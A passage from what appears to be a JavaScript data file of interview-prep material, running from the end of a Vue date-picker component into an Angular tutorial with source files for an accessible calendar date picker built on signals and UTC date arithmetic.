  { n: 12, text: "»", name: "Next year" },
];

// Click outside closes. The listener lives only while the popup is open.
const onDown = (e) => {
  if (!wrap.value?.contains(e.target)) open.value = false;
};
watch(open, (isOpen) => {
  if (isOpen) document.addEventListener("mousedown", onDown);
  else document.removeEventListener("mousedown", onDown);
});
onBeforeUnmount(() => document.removeEventListener("mousedown", onDown));

const cellClass = (iso) => ({
  day: true,
  outside: iso.slice(0, 7) !== focused.value.slice(0, 7),
  today: iso === today,
  selected: iso === value.value,
  disabled: disabled(iso),
});
</script>

<template>
  <div class="dp" ref="wrap">
    <span class="dp-label">{{ label }}</span>
    <button
      ref="trigger"
      type="button"
      class="dp-trigger"
      data-testid="trigger"
      aria-haspopup="dialog"
      :aria-expanded="open"
      @click="open ? close(false) : openPicker()"
    >
      {{ value ? longLabel(value) : "Pick a date" }}
    </button>
    <div
      v-if="open"
      role="dialog"
      aria-modal="true"
      :aria-labelledby="headingId"
      class="dp-pop"
      @keydown="onDialogKey"
    >
      <div class="dp-head">
        <template v-for="(b, i) in navs" :key="b.n">
          <h2
            v-if="i === 2"
            :id="headingId"
            aria-live="polite"
            data-testid="heading"
          >
            {{ MONTHS[view.m] }} {{ view.y }}
          </h2>
          <button
            type="button"
            :aria-label="b.name"
            :disabled="blocked(b.n)"
            @click="moveTo(addMonths(focused, b.n), false)"
          >
            {{ b.text }}
          </button>
        </template>
      </div>
      <table
        role="grid"
        :aria-labelledby="headingId"
        ref="grid"
        @keydown="onGridKey"
      >
        <thead>
          <tr>
            <th v-for="d in heads" :key="d" scope="col" :abbr="d">
              {{ d.slice(0, 2) }}
            </th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="(row, r) in rows" :key="r">
            <td
              v-for="iso in row"
              :key="iso"
              :class="cellClass(iso)"
              :data-date="iso"
              :tabindex="iso === focused ? 0 : -1"
              :aria-label="longLabel(iso)"
              :aria-selected="iso === value"
              :aria-disabled="disabled(iso) || undefined"
              :aria-current="iso === today ? 'date' : undefined"
              @click="select(iso)"
            >
              {{ parts(iso).d }}
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>
`,
          "/src/dates.js": `// Calendar-date helpers. A date is an ISO
// string "YYYY-MM-DD" (no time, no zone).
// All arithmetic goes through Date.UTC, which has no daylight-saving jumps,
// so the grid is the same in every time zone.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const WEEKDAYS = [
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
];

const pad = (n) => String(n).padStart(2, "0");

// Normalises overflow: toISO(2024, 1, 30) is "2024-03-01".
export function toISO(y, m, d) {
  const t = new Date(Date.UTC(y, m, d));
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
}
export function parts(iso) {
  const [y, m, d] = iso.split("-").map(Number);
  return { y, m: m - 1, d };
}
export const daysInMonth = (y, m) =>
  new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
export const weekday = (iso) => {
  const { y, m, d } = parts(iso);
  return new Date(Date.UTC(y, m, d)).getUTCDay();
};
export const addDays = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m, d + n);
};
// Jan 31 + 1 month is Feb 29 (2024), not Mar 2: clamp to the target month.
export const addMonths = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
// "Today" is the user's LOCAL calendar date, read once from the clock.
export const todayISO = () => {
  const now = new Date();
  return toISO(now.getFullYear(), now.getMonth(), now.getDate());
};
// 6 weeks x 7 days = 42 cells, starting on the weekStart before the 1st.
export function monthGrid(y, m, weekStart = 0) {
  const first = toISO(y, m, 1);
  const lead = (weekday(first) - weekStart + 7) % 7;
  const start = addDays(first, -lead);
  return Array.from({ length: 42 }, (_, i) => addDays(start, i));
}
export const longLabel = (iso) => {
  const { y, m, d } = parts(iso);
  return WEEKDAYS[weekday(iso)] + ", " + MONTHS[m] + " " + d + ", " + y;
};
export const clamp = (iso, min, max) =>
  min && iso < min ? min : max && iso > max ? max : iso;
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers preparing for a machine coding round. Assumes standalone components and signals at a basic level; no calendar or ARIA background needed.
**Difficulty:** Hard

> **How to read this doc:** Plain explanation first, then a <code>📌 Interview term:</code> callout with the precise vocabulary. The "Verified" output was printed by this Angular 22.2.3 solution, booted with \`bootstrapApplication(AppComponent)\` and no providers, both AOT-compiled with strict templates and JIT-compiled at runtime the way the playground runs it.

## 1. Why This Even Matters — A Story First

The receptionist with a paper calendar knows two things by heart: where the 1st falls, and what "the same day next month" means when next month is shorter. A date picker encodes that knowledge, and adds a third job paper never had: telling a keyboard and screen reader user exactly where they are. It is a favourite interview widget because it touches date math, change detection and accessibility at once.

The range version, [Build a Date Picker Calendar with Range Selection](/interview-question/build-a-date-picker-calendar-with-range-selection), assumes this one.

## 2. Requirements and the Signal Model

A trigger opens a month grid (always 6 × 7). Month and year navigation, today highlighted, days before \`min\` disabled, full keyboard support, Escape closes, focus returns to the trigger.

| Piece | Angular tool | Why |
| :--- | :--- | :--- |
| Selected date | \`@Input() value\` + \`@Output() valueChange\` | Enables \`[(value)]="date"\` in the parent, even when \`date\` is a signal. |
| \`open\`, \`focused\` | \`signal()\` | Writes schedule a render in a zoneless app. |
| Visible month, rows | \`computed()\` | Derived from \`focused\`, never stored. |
| Grid and trigger elements | \`@ViewChild\` | DOM handles for focus. |
| Focus after render | \`afterNextRender()\` | Runs once after Angular has updated the DOM. |
| Outside click | \`@HostListener("document:mousedown")\` | Declared on the class, removed with the component. |

📌 **Interview term: Two-way binding with banana-in-a-box** — \`[(value)]="date"\` is shorthand for \`[value]="date" (valueChange)="date = $event"\`. It works with a \`WritableSignal\` on the parent side too: Angular reads the signal and calls \`.set()\` for you. The playground compiles at runtime (JIT), where signal \`model()\` inputs do not register, so the classic \`@Input\` / \`@Output\` pair is used; see [how children emit events](/interview-question/how-do-child-components-emit-events-to-parents).

📌 **Interview term: Zoneless change detection** — Angular without zone.js; the \`@angular/core\` 22 typings note that "Zoneless is enabled by default in Angular v21+". Angular re-renders when a signal it read changes or a template event fires, not after every \`setTimeout\`. So every piece of state that changes the view here is a signal ([Angular signals](/interview-question/what-are-angular-signals)).

## 3. Build It Step by Step

### 3.1 Dates as strings, math in UTC

The helpers in \`dates.ts\` are the same pure functions as the React and Vue versions, typed:

\`\`\`ts
export function toISO(y: number, m: number, d: number): string {
  // overflow normalised, no daylight saving in UTC
  const t = new Date(Date.UTC(y, m, d));
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
}
export const addMonths = (iso: string, n: number) => {
  const { y, m, d } = parts(iso);
  // Jan 31 -> Feb 29
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
\`\`\`

📌 **Interview term: DST-safe date arithmetic** — never add 86,400,000 ms to a local midnight. In New York, 1 November 2026 lasts 25 hours, and a naive loop printed that month as \`1,1,2,3,...\`. \`Date.UTC\` days are always 24 hours, so the 42-cell grid comes out the same in every zone. For the modern API see [Temporal](/interview-question/how-does-the-temporal-api-fix-javascript-date-instant-plaindate-and-zoneddatetim).

### 3.2 Signals and computed rows

\`\`\`ts
open = signal(false);
focused = signal(todayISO());
view = computed(() => parts(this.focused()));
rows = computed(() => {
  const cells = monthGrid(this.view().y, this.view().m, WEEK_START);
  return [0, 1, 2, 3, 4, 5].map((r) => cells.slice(r * 7, r * 7 + 7));
});
\`\`\`

📌 **Interview term: computed signal** — a memoised value that recomputes only when a signal it read changes, unlike a template method call that runs on every check ([computed vs methods](/interview-question/what-is-the-difference-between-computed-signals-and-standard-method-getter-calls)).

### 3.3 Control flow and the \`track\` expression

\`\`\`html
@for (row of rows(); track $index) {
  <tr>
    @for (iso of row; track $index) {
      <td class="day" [class.selected]="iso === value" [attr.data-date]="iso"
        [attr.tabindex]="iso === focused() ? 0 : -1" [attr.aria-label]="longLabel(iso)"
        [attr.aria-selected]="iso === value" [attr.aria-disabled]="disabled(iso) || null"
        [attr.aria-current]="iso === today ? 'date' : null" (click)="select(iso)">{{ day(iso) }}</td>
    }
  </tr>
}
\`\`\`

Binding \`null\` to \`[attr.x]\` removes the attribute. The first draft tracked cells by \`iso\`. That is correct, but every month change replaces all 42 dates, and Angular's dev mode printed warning \`NG0956\` ("The configured tracking expression (track by identity) caused re-creation of the entire collection of size 7") in each driver run (a console warning, 150 times per run, not an error). A calendar grid is positional (row 2, column 3), so \`track $index\` reuses the 42 \`<td>\` elements and only updates their bindings; the warning disappeared. More on this in [why @for requires track](/interview-question/why-does-for-require-track-and-how-does-empty-improve-ux).

### 3.4 Roving tabindex and \`afterNextRender\`

Exactly one cell has \`tabindex="0"\`. After a key moves \`focused\`, the new cell must receive DOM focus, but only after Angular has rendered it:

\`\`\`ts
private focusCell() {
  afterNextRender(
    () =>
      this.grid?.nativeElement
        .querySelector<HTMLElement>('[tabindex="0"]')
        ?.focus(),
    { injector: this.injector },
  );
}
moveTo(iso: string, takeFocus: boolean) {
  this.focused.set(clamp(iso, this.min, this.max));
  if (takeFocus) this.focusCell();
}
\`\`\`

📌 **Interview term: afterNextRender** — registers a callback that runs once, after the next time Angular finishes rendering. Called outside a constructor it needs an \`injector\` option (here from \`inject(Injector)\`). It replaces \`setTimeout(() => el.focus())\` hacks ([afterRender vs afterNextRender](/interview-question/what-is-the-difference-between-afterrender-and-afternextrender-lifecycle-hooks)).

📌 **Interview term: Roving tabindex** — one tabbable child in a composite widget, moved by the arrow keys; Tab enters and leaves the grid in one step.

### 3.5 Keys, dialog and outside click

\`(keydown)\` on the table maps keys to targets (arrows ±1 / ±7, Home / End to week edges, PageUp / PageDown ±1 month, Shift for ±12). \`(keydown)\` on the dialog handles Escape and a Tab trap over enabled buttons plus the single \`tabindex="0"\` cell, like an [accessible modal](/interview-question/build-an-accessible-modal-with-focus-trap-scroll-lock).

\`\`\`ts
@HostListener("document:mousedown", ["$event"])
onDocDown(e: MouseEvent) {
  if (
    this.open() &&
    !this.host.nativeElement.contains(e.target as Node)
  )
    this.open.set(false);
}
\`\`\`

\`@HostListener\` on \`document:\` is attached for the component lifetime and removed on destroy, so there is nothing to clean up by hand.

## 4. Verified

Booted twice (AOT with \`strictTemplates\`, then runtime JIT) in jsdom with \`TZ=America/New_York\`; both modes printed identical lines, and they match the React and Vue runs:

\`\`\`text
TZ=America/New_York trigger: "Saturday, February 10, 2024"
open: dialog | expanded: true | focus: 2024-02-10
February 2024: 2024-01-28 .. 2024-03-09 (42 cells, strictly increasing: true)
Feb 1 disabled (min 2024-02-05): true | Prev month disabled: true
click Feb 1 (disabled) -> still open | Selected: 2024-02-10
after Right, Down, End, Home, Up, Up -> focus: 2024-02-05 (clamped at min)
PageDown -> 2024-03-05 | March 2024
Left, PageUp -> 2024-02-05
Shift+PageDown -> 2025-02-05 | tabindex=0 cells: 1
March 2026: 2026-03-01 .. 2026-04-11 (42 cells, strictly increasing: true)
November 2026: 2026-11-01 .. 2026-12-12 (42 cells, strictly increasing: true)
Previous year button -> November 2025 | focus stays on: Previous year
Tab x5: Previous month > Next month > Next year > 2025-11-05 > Previous year | Shift+Tab: 2025-11-05
Enter -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopen focus: 2025-11-05 | selected cell aria-selected: 2025-11-05
Escape -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopened: open
mousedown outside -> closed
\`\`\`

\`Selected:\` is rendered by \`AppComponent\` from its \`date\` signal, so it proves \`[(value)]\` updated the parent. \`focus: 2024-02-10\` right after opening shows \`afterNextRender\` ran after the dialog was in the DOM. The \`TZ=Pacific/Auckland\` run printed the same. jsdom does not focus buttons on click, so the driver focused "Previous year" before clicking; visual layout was not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Leap years, DST | UTC-only arithmetic, day-zero month length |
| Out-of-range focus | \`clamp\` and disabled nav buttons |
| Semantics | \`role="dialog"\` + \`aria-modal\`, \`role="grid"\`, \`aria-selected\`, \`aria-current="date"\`, live \`h2\` |
| Focus | Into the grid on open, trapped, back to the trigger on close |
| \`@Input\` timing | Inputs are read in methods, never in the constructor |

## 6. Common Pitfalls

- **Plain fields for state.** In a zoneless app, a field changed in a callback the template did not trigger does not re-render. Use signals.
- **\`setTimeout\` to focus.** It usually works and sometimes races the render. \`afterNextRender\` is deterministic.
- **\`track iso\` on a positional grid.** Correct but recreates every cell per month, and dev mode warns NG0956. Track by \`$index\`.
- **Signal \`input()\` / \`model()\` in the playground.** They do not register under runtime JIT; use \`@Input\` and \`@Output\`.
- **\`[attr.aria-disabled]="false"\`.** Renders \`aria-disabled="false"\` on every cell; bind \`null\` to remove it.
- **\`new Date("2024-02-10")\`.** UTC midnight, which is the 9th in the Americas.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Contract:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@Input</code> value and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@Output</code> valueChange so the parent writes <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">[(value)]</code>, plus min and max inputs."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Signals:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">open</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code> are signals; the visible month and the six rows are <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> from <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Dates:</strong> <span style="color:#f0e2c8;">"ISO strings with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Date.UTC</code> arithmetic, day zero for month length, and clamping for month jumps."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Focus:</strong> <span style="color:#f0e2c8;">"A roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code>, a key map that sets <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>, then <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">afterNextRender</code> focuses the new cell."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Dialog:</strong> <span style="color:#f0e2c8;">"Escape and a Tab trap on the dialog, focus back to the trigger, and a document <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@HostListener</code> for outside clicks."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not Angular Material or the CDK?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">In a real app <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">MatDatepicker</code> or CDK a11y utilities save time. In the interview they want the grid math and focus handling, which is exactly what those libraries hide.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you make it a form control?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Implement <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ControlValueAccessor</code> (<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">writeValue</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">registerOnChange</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">registerOnTouched</code>) so it works with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">formControlName</code>, calling <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">onTouched</code> when the dialog closes.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">afterNextRender</code> and not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">effect</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">An <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">effect</code> runs because signals changed; it is not a promise that the DOM for that change has been rendered. <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">afterNextRender</code> is tied to the render itself, which is what focusing a freshly rendered cell needs.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">TestBed with the component, dispatch keydown events, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">await fixture.whenStable()</code>, assert <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">document.activeElement</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code>, and run the pure date helpers under several <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">TZ</code> values.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Banana-in-a-box** | \`[(x)]\`: an \`x\` input plus an \`xChange\` output |
| **Zoneless change detection** | Angular renders on signal changes and template events, without zone.js |
| **computed signal** | Memoised derived value |
| **afterNextRender** | Run once after the next render |
| **Roving tabindex** | One tabbable cell, moved by arrows |
| **DST-safe arithmetic** | Calendar math in UTC so a day is always 24 hours |

---
**Conclusion:** The Angular picker keeps state in signals, derives the grid with \`computed\`, renders it with \`@for\` tracked by position, and uses \`afterNextRender\` for the one imperative step: moving focus after the DOM changes. The verified run shows both compilation modes behaving identically, the same grid in several time zones, and a parent signal updated through \`[(value)]\`.`,
        files: {
          "/src/app/app.component.ts": `import { Component, signal } from "@angular/core";
import { DatePickerComponent } from "./date-picker.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [DatePickerComponent],
  styles: [
    \`
      :host {
        display: block;
        min-height: 100vh;
        background: #0f1115;
        color: #e6e6e6;
        font-family: system-ui, sans-serif;
      }
      .page {
        max-width: 420px;
        margin: 0 auto;
        padding: 24px 16px;
      }
      .out {
        margin-top: 16px;
        font-size: 14px;
        color: #9aa4b2;
      }
      :host ::ng-deep .dp {
        position: relative;
        display: flex;
        flex-direction: column;
        gap: 6px;
      }
      :host ::ng-deep .dp-label {
        font-size: 13px;
        color: #9aa4b2;
      }
      :host ::ng-deep .dp-trigger {
        text-align: left;
        padding: 10px 12px;
        border-radius: 8px;
        border: 1px solid #2c3340;
        background: #171a21;
        color: inherit;
        font: inherit;
        cursor: pointer;
      }
      :host ::ng-deep .dp-pop {
        position: absolute;
        top: 100%;
        left: 0;
        margin-top: 6px;
        z-index: 10;
        width: min(320px, 100%);
        background: #171a21;
        border: 1px solid #2c3340;
        border-radius: 12px;
        padding: 12px;
        box-shadow: 0 10px 30px #0008;
      }
      :host ::ng-deep .dp-head {
        display: flex;
        align-items: center;
        gap: 4px;
        margin-bottom: 8px;
      }
      :host ::ng-deep .dp-head h2 {
        flex: 1;
        text-align: center;
        font-size: 15px;
        margin: 0;
      }
      :host ::ng-deep .dp-head button {
        background: none;
        border: 0;
        color: #c9d1d9;
        font-size: 18px;
        width: 32px;
        height: 32px;
        border-radius: 6px;
        cursor: pointer;
      }
      :host ::ng-deep .dp-head button:disabled {
        opacity: 0.3;
        cursor: default;
      }
      :host ::ng-deep table {
        width: 100%;
        border-collapse: collapse;
      }
      :host ::ng-deep th {
        font-size: 12px;
        color: #8b949e;
        font-weight: 500;
        padding: 4px 0;
      }
      :host ::ng-deep td.day {
        text-align: center;
        padding: 8px 0;
        border-radius: 8px;
        cursor: pointer;
        font-size: 14px;
      }
      :host ::ng-deep td.day:hover {
        background: #222834;
      }
      :host ::ng-deep td.day:focus {
        outline: 2px solid #f9a825;
        outline-offset: -2px;
      }
      :host ::ng-deep td.outside {
        color: #5d6573;
      }
      :host ::ng-deep td.today {
        font-weight: 700;
        color: #f9a825;
      }
      :host ::ng-deep td.selected {
        background: #f9a825;
        color: #1c140a;
      }
      :host ::ng-deep td.disabled {
        color: #3d434d;
        cursor: not-allowed;
        text-decoration: line-through;
      }
    \`,
  ],
  template: \`
    <main class="page">
      <app-date-picker
        label="Check-in date"
        [(value)]="date"
        min="2024-02-05"
        max="2027-12-31"
      />
      <p class="out" data-testid="out">Selected: {{ date() || "none" }}</p>
    </main>
  \`,
})
export class AppComponent {
  date = signal<string | null>("2024-02-10");
}
`,
          "/src/app/date-picker.component.ts": `import {
  Component,
  ElementRef,
  EventEmitter,
  HostListener,
  Injector,
  Input,
  Output,
  ViewChild,
  afterNextRender,
  computed,
  inject,
  signal,
} from "@angular/core";
import {
  MONTHS,
  WEEKDAYS,
  addDays,
  addMonths,
  clamp,
  longLabel,
  monthGrid,
  parts,
  toISO,
  todayISO,
  weekday,
} from "./dates";

const WEEK_START = 0; // 0 = Sunday first, 1 = Monday first
let nextId = 0;

@Component({
  selector: "app-date-picker",
  standalone: true,
  template: \`
    <div class="dp">
      <span class="dp-label">{{ label }}</span>
      <button #trigger type="button" class="dp-trigger" data-testid="trigger" aria-haspopup="dialog"
        [attr.aria-expanded]="open()" (click)="open() ? close(false) : openPicker()">
        {{ value ? longLabel(value) : "Pick a date" }}
      </button>
      @if (open()) {
        <div
          role="dialog"
          aria-modal="true"
          [attr.aria-labelledby]="headingId"
          class="dp-pop"
          (keydown)="onDialogKey($event)"
        >
          <div class="dp-head">
            @for (b of navs; track b.n; let i = $index) {
              @if (i === 2) {
                <h2
                  [id]="headingId"
                  aria-live="polite"
                  data-testid="heading"
                >{{ months[view().m] }} {{ view().y }}</h2>
              }
              <button
                type="button"
                [attr.aria-label]="b.name"
                [disabled]="blocked(b.n)"
                (click)="moveTo(addMonths(focused(), b.n), false)"
              >{{ b.text }}</button>
            }
          </div>
          <table
            #grid
            role="grid"
            [attr.aria-labelledby]="headingId"
            (keydown)="onGridKey($event)"
          >
            <thead>
              <tr>
                @for (d of heads; track d) { <th scope="col" [attr.abbr]="d">{{ d.slice(0, 2) }}</th> }
              </tr>
            </thead>
            <tbody>
              @for (row of rows(); track $index) {
                <tr>
                  @for (iso of row; track $index) {
                    <td class="day" [class.outside]="iso.slice(0, 7) !== focused().slice(0, 7)" [class.today]="iso === today"
                      [class.selected]="iso === value" [class.disabled]="disabled(iso)" [attr.data-date]="iso"
                      [attr.tabindex]="iso === focused() ? 0 : -1" [attr.aria-label]="longLabel(iso)"
                      [attr.aria-selected]="iso === value" [attr.aria-disabled]="disabled(iso) || null"
                      [attr.aria-current]="iso === today ? 'date' : null" (click)="select(iso)">
                      {{ day(iso) }}
                    </td>
                  }
                </tr>
              }
            </tbody>
          </table>
        </div>
      }
    </div>
  \`,
})
export class DatePickerComponent {
  @Input() value: string | null = null;
  // [(value)] two-way binding
  @Output() valueChange = new EventEmitter<string>();
  @Input() min?: string;
  @Input() max?: string;
  @Input() label = "Date";
  @ViewChild("grid") grid?: ElementRef<HTMLTableElement>;
  @ViewChild("trigger") trigger?: ElementRef<HTMLButtonElement>;

  private host = inject(ElementRef);
  private injector = inject(Injector);
  readonly months = MONTHS;
  readonly heads = WEEKDAYS.map((_, i) => WEEKDAYS[(i + WEEK_START) % 7]);
  readonly navs = [
    { n: -12, text: "«", name: "Previous year" },
    { n: -1, text: "‹", name: "Previous month" },
    { n: 1, text: "›", name: "Next month" },
    { n: 12, text: "»", name: "Next year" },
  ];
  readonly headingId = "dp-heading-" + nextId++;
  readonly today = todayISO();
  readonly longLabel = longLabel;
  readonly addMonths = addMonths;

  open = signal(false);
  focused = signal(todayISO());
  // The visible month always follows the focused day.
  view = computed(() => parts(this.focused()));
  rows = computed(() => {
    const cells = monthGrid(this.view().y, this.view().m, WEEK_START);
    return [0, 1, 2, 3, 4, 5].map((r) => cells.slice(r * 7, r * 7 + 7));
  });

  day = (iso: string) => parts(iso).d;
  disabled = (iso: string) =>
    !!((this.min && iso < this.min) || (this.max && iso > this.max));
  blocked(n: number) {
    const { y, m } = this.view();
    return !!(n < 0
      ? this.min && toISO(y, m + n + 1, 0) < this.min
      : this.max && toISO(y, m + n, 1) > this.max);
  }

  private focusCell() {
    // Runs once, after Angular has rendered the new grid (roving tabindex).
    afterNextRender(
      () =>
        this.grid?.nativeElement
          .querySelector<HTMLElement>('[tabindex="0"]')
          ?.focus(),
      { injector: this.injector },
    );
  }
  openPicker() {
    this.focused.set(clamp(this.value || this.today, this.min, this.max));
    this.open.set(true);
    this.focusCell();
  }
  close(returnFocus: boolean) {
    this.open.set(false);
    if (returnFocus) this.trigger?.nativeElement.focus();
  }
  moveTo(iso: string, takeFocus: boolean) {
    this.focused.set(clamp(iso, this.min, this.max));
    if (takeFocus) this.focusCell();
  }
  select(iso: string) {
    if (this.disabled(iso)) return;
    this.value = iso;
    this.valueChange.emit(iso);
    this.close(true);
  }

  onGridKey(e: KeyboardEvent) {
    const f = this.focused();
    const dow = (weekday(f) - WEEK_START + 7) % 7;
    const moves: Record<string, () => string> = {
      ArrowLeft: () => addDays(f, -1),
      ArrowRight: () => addDays(f, 1),
      ArrowUp: () => addDays(f, -7),
      ArrowDown: () => addDays(f, 7),
      Home: () => addDays(f, -dow),
      End: () => addDays(f, 6 - dow),
      PageUp: () => addMonths(f, e.shiftKey ? -12 : -1),
      PageDown: () => addMonths(f, e.shiftKey ? 12 : 1),
    };
    if (moves[e.key]) {
      e.preventDefault();
      this.moveTo(moves[e.key](), true);
    } else if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      this.select(f);
    }
  }

  onDialogKey(e: KeyboardEvent) {
    if (e.key === "Escape") {
      e.preventDefault();
      this.close(true);
      return;
    }
    if (e.key !== "Tab") return; // focus trap
    const box = e.currentTarget as HTMLElement;
    const items = [
      ...box.querySelectorAll<HTMLElement>(
        'button:not([disabled]), [tabindex="0"]',
      ),
    ];
    const i = items.indexOf(document.activeElement as HTMLElement);
    const next = e.shiftKey
      ? i <= 0
        ? items.length - 1
        : i - 1
      : i === items.length - 1
        ? 0
        : i + 1;
    e.preventDefault();
    items[next].focus();
  }

  // Click outside closes without moving focus.
  @HostListener("document:mousedown", ["$event"])
  onDocDown(e: MouseEvent) {
    if (this.open() && !this.host.nativeElement.contains(e.target as Node))
      this.open.set(false);
  }
}
`,
          "/src/app/dates.ts": `// Calendar-date helpers. A date is an ISO
// string "YYYY-MM-DD" (no time, no zone).
// All arithmetic goes through Date.UTC, which has no daylight-saving jumps,
// so the grid is the same in every time zone.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const WEEKDAYS = [
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
];

const pad = (n: number) => String(n).padStart(2, "0");

// Normalises overflow: toISO(2024, 1, 30) is "2024-03-01".
export function toISO(y: number, m: number, d: number): string {
  const t = new Date(Date.UTC(y, m, d));
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
}
export function parts(iso: string) {
  const [y, m, d] = iso.split("-").map(Number);
  return { y, m: m - 1, d };
}
export const daysInMonth = (y: number, m: number) =>
  new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
export const weekday = (iso: string) => {
  const { y, m, d } = parts(iso);
